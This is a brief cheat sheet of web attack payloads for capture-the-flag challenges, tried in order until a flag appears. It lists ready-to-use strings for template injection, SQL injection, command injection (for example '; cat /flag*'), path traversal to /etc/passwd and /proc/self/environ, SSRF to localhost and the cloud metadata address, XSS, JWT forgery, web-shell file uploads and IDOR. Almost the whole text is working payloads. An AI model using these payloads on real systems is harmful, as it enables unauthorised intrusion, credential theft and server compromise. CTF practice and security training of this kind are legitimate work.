# Common web CTF payloads — try in order; stop when flag appears.

## SSTI
- `{{7*7}}` → 49
- `${7*7}`
- `<%= 7*7 %>`
- `{{config}}` / `{{self.__dict__}}` (Jinja)

## SQLi
- `' OR '1'='1' -- `
- `' OR 1=1-- `
- `" OR "1"="1" -- `
- `' UNION SELECT null,null-- `
- `' UNION SELECT 1,flag,3 FROM flags-- ` (guess table)
- time: `' OR SLEEP(3)-- ` / `'; pg_sleep(3)-- `

## Command injection
- `; id`
- `| id`
- `$(id)`
- `` `id` ``
- `; cat /flag*`
- `| cat /flag.txt`

## LFI / path
- `....//....//....//etc/passwd`
- `../../../etc/passwd`
- `php://filter/convert.base64-encode/resource=index.php`
- `/proc/self/environ`
- `....//....//flag`

## SSRF
- `http://127.0.0.1/`
- `http://127.0.0.1:80/flag`
- `http://169.254.169.254/` (only if challenge implies cloud)
- `file:///flag`
- `file:///etc/passwd`

## XSS (only if leads to admin/flag)
- `<script>alert(1)</script>`
- `" onmouseover="alert(1)`

## JWT
- alg none
- weak secret brute (`secret`, `password`, `jwt`, `key`, `ctf`)

## Upload
- `shell.php`, `shell.php.jpg`, `shell.phtml`
- GIF89a header + php payload
- content-type spoof `image/png`

## IDOR
- change id 1→2, uuid iterate, `/api/user/1` vs `/api/user/me`
